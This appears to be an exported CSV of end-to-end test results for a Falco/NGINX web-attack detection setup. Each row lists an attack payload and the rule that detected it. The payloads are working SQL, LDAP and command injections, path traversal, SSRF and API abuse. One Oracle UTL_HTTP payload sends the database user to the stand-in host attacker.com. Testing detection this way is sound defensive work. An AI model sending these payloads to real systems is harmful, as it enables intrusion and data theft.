"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_093` |
| **Name** | Blind SQLi with Subquery |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `1' AND (SELECT COUNT(*) FROM users)>0--`
- **Encoded**: `1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 14:45:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_093-1770821120441-2hlk6b pattern_id=SQLI_ADV_093 uri=/?q=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_093-1770821120441-2hlk6b pattern_id=SQLI_ADV_093 uri=/?q=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:20.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_ADV_093-1770821120441-2hlk6b pattern_id=SQLI_ADV_093 uri=/?q=1%27%20AND%20%28SELECT%20COUNT%28%2A%29%20FROM%20users%29%3E0-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[019_SQLI_ADV_093]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `LDAP_BLIND_001` |
| **Name** | LDAP blind password enumeration |
| **Category** | LDAP |
| **Subcategory** | blind_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `*)(uid=admin)(password=a*`
- **Encoded**: `*)(uid%3Dadmin)(password%3Da*`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~57000ms
- **Timestamp**: 14:45:01.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX LDAP Injection] Authentication bypass attempt` |
| **Matched Rule** | `[NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_001-1770821101843-1aljuj pattern_id=LDAP_BLIND_001 uri=/?q=*)(uid%3Dadmin)(password%3Da* client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_001-1770821101843-1aljuj pattern_id=LDAP_BLIND_001 uri=/?q=*)(uid%3Dadmin)(password%3Da* client=127.0.0.1

**Falco Log Entry**:
```
14:45:01.000000000: Critical [NGINX LDAP Injection] Authentication bypass attempt test_id=LDAP_BLIND_001-1770821101843-1aljuj pattern_id=LDAP_BLIND_001 uri=/?q=*)(uid%3Dadmin)(password%3Da* client=127.0.0.1
```","2","test_e2e_with_logs[387_LDAP_BLIND_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `GQL_DATA_002` |
| **Name** | GraphQL mass extraction via limit keyword |
| **Category** | GRAPHQL |
| **Subcategory** | data_extraction |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `limit:999999`
- **Encoded**: `limit%3A999999`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~45000ms
- **Timestamp**: 14:45:13.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX GraphQL Attack] Mass data extraction attempt` |
| **Matched Rule** | `[NGINX GraphQL Attack] Mass data extraction attempt test_id=GQL_DATA_002-1770821113345-y5tusb pattern_id=GQL_DATA_002 uri=/?q=limit%3A999999 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX GraphQL Attack] Mass data extraction attempt test_id=GQL_DATA_002-1770821113345-y5tusb pattern_id=GQL_DATA_002 uri=/?q=limit%3A999999 client=127.0.0.1

**Falco Log Entry**:
```
14:45:13.000000000: Warning [NGINX GraphQL Attack] Mass data extraction attempt test_id=GQL_DATA_002-1770821113345-y5tusb pattern_id=GQL_DATA_002 uri=/?q=limit%3A999999 client=127.0.0.1
```","2","test_e2e_with_logs[420_GQL_DATA_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_006` |
| **Name** | URL encoded backtick execution |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `%60id%60`
- **Encoded**: `%2560id%2560`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~50000ms
- **Timestamp**: 14:45:08.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_006-1770821108887-o587is pattern_id=CMD_ENC_006 uri=/?q=%2560id%2560 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_006-1770821108887-o587is pattern_id=CMD_ENC_006 uri=/?q=%2560id%2560 client=127.0.0.1

**Falco Log Entry**:
```
14:45:08.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENC_006-1770821108887-o587is pattern_id=CMD_ENC_006 uri=/?q=%2560id%2560 client=127.0.0.1
```","1","test_e2e_with_logs[331_CMD_ENC_006]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_005` |
| **Name** | Conditional error-based blind injection |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1 --`
- **Encoded**: `%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~63000ms
- **Timestamp**: 14:44:55.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1770821095882-g45g5d pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1770821095882-g45g5d pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:44:55.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BLIND_005-1770821095882-g45g5d pattern_id=SQLI_BLIND_005 uri=/?q=%27%20AND%20%28SELECT%20CASE%20WHEN%20%281%3D1%29%20THEN%201%20ELSE%20%28SELECT%201%20UNION%20SELECT%202%29%20END%29%3D1%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[026_SQLI_BLIND_005]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_TIME_013` |
| **Name** | Sleep with SQL comment |
| **Category** | SQLI |
| **Subcategory** | time_based_blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `SLEEP/*comment*/(5)`
- **Encoded**: `SLEEP/%2Acomment%2A/%285%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~78000ms
- **Timestamp**: 14:44:40.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1770821080350-y13r4d pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1770821080350-y13r4d pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:44:40.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_TIME_013-1770821080350-y13r4d pattern_id=SQLI_TIME_013 uri=/?q=SLEEP/%2Acomment%2A/%285%29 client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[108_SQLI_TIME_013]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_001` |
| **Name** | Oracle UTL_HTTP OOB Exfiltration |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--`
- **Encoded**: `'%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~30000ms
- **Timestamp**: 14:45:28.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1770821128961-7in12 pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1770821128961-7in12 pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:28.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1770821128961-7in12 pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET
```","1","test_e2e_with_logs[081_SQLI_OOB_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SSRF_INT_001` |
| **Name** | Internal Redis Service Access |
| **Category** | SSRF |
| **Subcategory** | internal_service |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `http://localhost:6379/`
- **Encoded**: `http%3A%2F%2Flocalhost%3A6379%2F`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~8000ms
- **Timestamp**: 14:45:50.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SSRF] SSRF attack attempt detected` |
| **Matched Rule** | `[NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_001-1770821150839-tvya3 pattern_id=SSRF_INT_001 uri=/?q=http%3A%2F%2Flocalhost%3A6379%2F client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_001-1770821150839-tvya3 pattern_id=SSRF_INT_001 uri=/?q=http%3A%2F%2Flocalhost%3A6379%2F client=127.0.0.1

**Falco Log Entry**:
```
14:45:50.000000000: Critical [NGINX SSRF] SSRF attack attempt detected test_id=SSRF_INT_001-1770821150839-tvya3 pattern_id=SSRF_INT_001 uri=/?q=http%3A%2F%2Flocalhost%3A6379%2F client=127.0.0.1
```","2","test_e2e_with_logs[452_SSRF_INT_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BYPASS_007` |
| **Name** | Hash comment bypass |
| **Category** | SQLI |
| **Subcategory** | bypass_waf |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' UNION%23comment%0ASELECT version(),NULL,NULL--`
- **Encoded**: `'%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~54000ms
- **Timestamp**: 14:45:04.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_007-1770821104403-03zzwm pattern_id=SQLI_BYPASS_007 uri=/?q='%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_007-1770821104403-03zzwm pattern_id=SQLI_BYPASS_007 uri=/?q='%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:45:04.000000000: Critical [NGINX SQLi] Boolean-based Blind SQL Injection test_id=SQLI_BYPASS_007-1770821104403-03zzwm pattern_id=SQLI_BYPASS_007 uri=/?q='%20UNION%2523comment%250ASELECT%20version()%2CNULL%2CNULL-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[056_SQLI_BYPASS_007]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_006` |
| **Name** | Hex encoded slash traversal |
| **Category** | PATH |
| **Subcategory** | advanced_techniques |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `..\x2f`
- **Encoded**: `..%5Cx2f`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~55000ms
- **Timestamp**: 14:45:03.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Windows path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1770821103881-5w13e9 pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1770821103881-5w13e9 pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1

**Falco Log Entry**:
```
14:45:03.000000000: Critical [NGINX Traversal] Windows path traversal attack detected test_id=PATH_ADV_006-1770821103881-5w13e9 pattern_id=PATH_ADV_006 uri=/?q=..%5Cx2f client=127.0.0.1
```","2","test_e2e_with_logs[220_PATH_ADV_006]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_002` |
| **Name** | Network-based time delay detection |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `&& ping -c 10 127.0.0.1`
- **Encoded**: `%26%26%20ping%20-c%2010%20127.0.0.1`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~56000ms
- **Timestamp**: 14:45:02.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BLIND_002-1770821102369-fp2ocn pattern_id=CMD_BLIND_002 uri=/?q=%26%26%20ping%20-c%2010%20127.0.0.1 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BLIND_002-1770821102369-fp2ocn pattern_id=CMD_BLIND_002 uri=/?q=%26%26%20ping%20-c%2010%20127.0.0.1 client=127.0.0.1

**Falco Log Entry**:
```
14:45:02.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BLIND_002-1770821102369-fp2ocn pattern_id=CMD_BLIND_002 uri=/?q=%26%26%20ping%20-c%2010%20127.0.0.1 client=127.0.0.1
```","1","test_e2e_with_logs[322_CMD_BLIND_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENV_001` |
| **Name** | Environment variable in PATH |
| **Category** | CMDINJ |
| **Subcategory** | env_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `PATH=/tmp:$PATH whoami`
- **Encoded**: `PATH%3D%2Ftmp%3A%24PATH%20whoami`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 14:45:10.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_001-1770821110891-y5b1z pattern_id=CMD_ENV_001 uri=/?q=PATH%3D%2Ftmp%3A%24PATH%20whoami client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_001-1770821110891-y5b1z pattern_id=CMD_ENV_001 uri=/?q=PATH%3D%2Ftmp%3A%24PATH%20whoami client=127.0.0.1

**Falco Log Entry**:
```
14:45:10.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_ENV_001-1770821110891-y5b1z pattern_id=CMD_ENV_001 uri=/?q=PATH%3D%2Ftmp%3A%24PATH%20whoami client=127.0.0.1
```","2","test_e2e_with_logs[332_CMD_ENV_001]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `API_BOLA_002` |
| **Name** | BOLA User Profile v2 Enumeration |
| **Category** | API_SECURITY |
| **Subcategory** | bola |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `/api/v2/users/2/profile`
- **Encoded**: `%2Fapi%2Fv2%2Fusers%2F2%2Fprofile`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 14:45:34.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX API Attack] API security vulnerability detected` |
| **Matched Rule** | `[NGINX API Attack] API security vulnerability detected test_id=API_BOLA_002-1770821134349-qbwbze pattern_id=API_BOLA_002 uri=/?q=%2Fapi%2Fv2%2Fusers%2F2%2Fprofile client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_002-1770821134349-qbwbze pattern_id=API_BOLA_002 uri=/?q=%2Fapi%2Fv2%2Fusers%2F2%2Fprofile client=127.0.0.1

**Falco Log Entry**:
```
14:45:34.000000000: Warning [NGINX API Attack] API security vulnerability detected test_id=API_BOLA_002-1770821134349-qbwbze pattern_id=API_BOLA_002 uri=/?q=%2Fapi%2Fv2%2Fusers%2F2%2Fprofile client=127.0.0.1
```","2","test_e2e_with_logs[398_API_BOLA_002]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ABS_006` |
| **Name** | Apache site configuration access |
| **Category** | PATH |
| **Subcategory** | absolute_paths |
| **Severity** | `MEDIUM` |

## Attack Details

- **Payload**: `/etc/apache2/sites-available/000-default.conf`
- **Encoded**: `%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~61000ms
- **Timestamp**: 14:44:57.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] File inclusion attack detected` |
| **Matched Rule** | `[NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1770821097866-p3qbzd pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1770821097866-p3qbzd pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1

**Falco Log Entry**:
```
14:44:57.000000000: Critical [NGINX Traversal] File inclusion attack detected test_id=PATH_ABS_006-1770821097866-p3qbzd pattern_id=PATH_ABS_006 uri=/?q=%2Fetc%2Fapache2%2Fsites-available%2F000-default.conf client=127.0.0.1
```","2","test_e2e_with_logs[211_PATH_ABS_006]","allure","2026-02-11","passed","2026-02-11","","test_e2e_wrapper","",""
